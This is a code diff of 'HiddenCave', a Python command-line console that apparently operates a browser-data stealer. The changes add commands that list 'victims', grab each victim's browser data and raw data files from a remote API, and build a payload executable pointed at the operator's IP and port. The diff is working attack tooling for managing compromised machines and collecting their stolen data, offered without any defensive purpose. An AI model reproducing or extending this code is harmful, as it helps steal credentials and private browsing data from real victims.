@@ -12,21 +12,21 @@ class HiddenCave(cmd.Cmd):
     CurrentData = None
 
     def default(self, arg):
-        print("[*] Invalid command, use help for information.")
+        print("[-] Invalid command, use help for information.")
 
     def do_exit(self, arg):
-        """exit the CLI.\n"""
+        "exit the CLI.\n"
         exit(0)
 
     def do_clear(self, arg):
-        """clear the stdout.\n"""
+        "clear the stdout.\n"
         if os.name == 'nt':
             _ = os.system('cls')
         else:
             _ = os.system('clear')
 
     def do_init(self, arg):
-        """init command\n"""
+        "init command for setting key and iv or the API url.\nusage: save <filename>\n"
         print("Choose an option:\n\t1. Set cryptographic parameters\n\t2. Set endpoint")
         UserInput = self.core.GetUserInput("[+] Enter the number (1 or 2): ", "[-] Invalid input. Enter either '1' to set cryptographic parameters or '2' to set an endpoint.", 0, ["1", "2"], False)
 
@@ -62,7 +62,7 @@ class HiddenCave(cmd.Cmd):
             self.core.ApiUrl = UserInput
 
     def do_save(self, arg):
-        """save command\n"""
+        "save the current cryptographic settings.\nusage: save <filename>\n"
         args = arg.split(".")
         if args[-1] != "json":
             print("[-] Invalid file name, The file must have the json file extention \".json\".")
@@ -74,9 +74,10 @@ class HiddenCave(cmd.Cmd):
                 return
 
         self.core.save(arg)
+        print("[+] Done.")
 
     def do_load(self, arg):
-        """load command\n"""
+        "load the cryptographic settings from a file.\nusage: load <filename>\n"
         args = arg.split(".")
         if args[-1] != "json":
             print("[-] Invalid file name, the file must have the json file extention \".json\".")
@@ -87,16 +88,21 @@ class HiddenCave(cmd.Cmd):
             return
 
         self.core.load(arg)
+        print("[+] Done.")
 
     def do_check(self, arg):
-        """endpoint and cryptographic parameters check command\n"""
+        "API and cryptographic parameters check command\n"
         self.core.check()
 
-    def do_getall(self, arg):
-        """getall command\n"""
+    def do_listv(self, arg):
+        "list the current victims.\n"
         self.CurrentData = self.core.GetVictims()
 
         if self.CurrentData is not None:
+            if len(self.CurrentData) == 0:
+                print("[+] No victims.")
+                return
+
             for ip in self.CurrentData.keys():
                 TotalBrowsers = int(self.CurrentData[ip]["BrowserCount"])
                 print("#" * 35)
@@ -120,7 +126,8 @@ class HiddenCave(cmd.Cmd):
         else:
             print("[-] You should first run the command check to check the endpoint and cryptographic parameters.")
 
-    def do_grab(self, arg):
+    def do_grabdata(self, arg):
+        "grabdata a victim\'s browser data.\nusage: grabdata <victim's ip address>.\n"
         if len(arg) == 0:
             print("[-] Invalid input.")
             return
@@ -131,8 +138,24 @@ class HiddenCave(cmd.Cmd):
             file = open(FileName, "w")
             json.dump(data, file, indent=4)
             file.close()
+            print(f"[+] Done, data has been saved in {FileName}")
+
+    def do_grabraw(self, arg):
+        "grabd a victim\'s raw data.\nusage: grabraw <victim's ip address>.\n"
+        if len(arg) == 0:
+            print("[-] Invalid input.")
+            return
+
+        data = self.core.GetVictimData(arg)
+        if data is not None:
+            FileName = arg + ".zip"
+            file = open(FileName, "wb")
+            file.write(data)
+            file.close()
+            print(f"[+] Done, data has been saved in {FileName}")
 
     def do_build(self, arg):
+        "build the payload.\n"
         ip = self.core.GetUserInput("[+] IP: ", "", 0, None, False)
         if self.core.IsValidIpv4(ip) is False:
             while True:
@@ -149,6 +172,15 @@ class HiddenCave(cmd.Cmd):
                     break
 
         self.core.BuildExe(ip, port)
+        print("[+] Building is done, the executable is in payload/bin.")
+
+        UserInput = self.core.GetUserInput("[+] Do you wanna set the ip and port used in building process as your API? ", "Input must be either Y or N", 0, ["y", "n"], True)
+        if UserInput == "n":
+            return
+
+        self.core.ApiUrl = f"http://{ip}:{port}"
+
+
 
 if __name__ == '__main__':
     try:
